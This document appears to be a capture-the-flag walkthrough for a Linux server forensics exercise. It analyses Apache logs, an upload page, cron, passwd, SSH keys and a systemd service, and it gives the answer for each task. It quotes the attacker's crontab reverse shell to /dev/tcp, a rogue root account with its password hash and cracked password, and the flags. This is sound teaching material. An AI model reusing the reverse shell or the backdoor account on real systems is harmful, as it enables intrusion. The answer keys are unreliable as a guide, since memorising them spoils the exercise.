# Linux Server Forensics

## Task 2 Apache Log Analysis I

#### How many different tools made requests to the server?

```bash
cd /var/log/apache2
cat access.log | cut -d '"' -f6 | sort -u | egrep -ai '(Nmap|SQLmap|DirBuster|Nikto)'
# DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
# Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
```

{% hint style="success" %}
`2`
{% endhint %}

#### Name a path requested by Nmap.

```bash
cat access.log | grep -a Nmap | cut -d ' ' -f7 | sort -u
```

{% hint style="success" %}
`/nmaplowercheck1618912425`
{% endhint %}

## Task 3 Web Server Analysis

#### What page allows users to upload files?

![](<.gitbook/assets/Screenshot from 2021-09-07 18-28-00.png>)

{% hint style="success" %}
`contact.php`
{% endhint %}

#### What IP uploaded files to the server?

```bash
cat access.log | grep -a 'POST /contact.php' | cut -d ' ' -f1
```

{% hint style="success" %}
`192.168.56.24`
{% endhint %}

#### Who left an exposed security notice on the server?

```bash
cat access.log | grep -a DirBuster | egrep '\s200\s' | cut -d ' ' -f7 | sort -u
# /resources/development/2021/docs/SECURITY.md
curl http://127.0.0.1/resources/development/2021/docs/SECURITY.md
# we have to really got to sort out the contact page theres **NO** validation whatsoever.
# I can't belive we haven't been hacked yet - Fred.
```

{% hint style="success" %}
`Fred`
{% endhint %}

## Task 4 Persistence Mechanisms I

#### What command and option did the attacker use to establish a backdoor?

```bash
cat /etc/crontab 
# *  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
```

{% hint style="success" %}
`sh -i`
{% endhint %}

## Task 5 User Accounts

#### What is the password of the second root account?

```bash
cat /etc/passwd | grep root2
# root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
```

![](<.gitbook/assets/Screenshot from 2021-09-07 19-03-21.png>)

{% hint style="success" %}
`mrcake`
{% endhint %}

## Task 7 Apache Log Analysis II

#### Name one of the non-standard HTTP Requests.

```
cat access.log | cut -d ' ' -f6 | sort -u
```

{% hint style="success" %}
`GXWR`
{% endhint %}

#### At what time was the Nmap scan performed?

```
cat access.log | grep -a GXWR
```

{% hint style="success" %}
`13:30:15`
{% endhint %}

## Task 8 Persistence Mechanisms II

```
sudo cat /root/.ssh/authorized_keys
```

{% hint style="success" %}
`kali@kali`
{% endhint %}

## Task 9 Program Execution History

#### What is the first command present in root's bash\_history file?

```
sudo cat /root/.bash_history | head -n1
```

{% hint style="success" %}
`nano /etc/passwd`
{% endhint %}

## Task 11 Persistence  Mechanisms III

#### Figure out what's going on and find the flag.

```bash
ls -lt /etc/systemd/system/*.service
systemctl status IpManager
# CGroup: /system.slice/IpManager.service
#         ├─1936 /bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
#         └─1949 sleep 10
cat /etc/network/ZGtsam5hZG1ua2Fu.sh | head
```

{% hint style="success" %}
`gh0st_1n_the_machine`
{% endhint %}
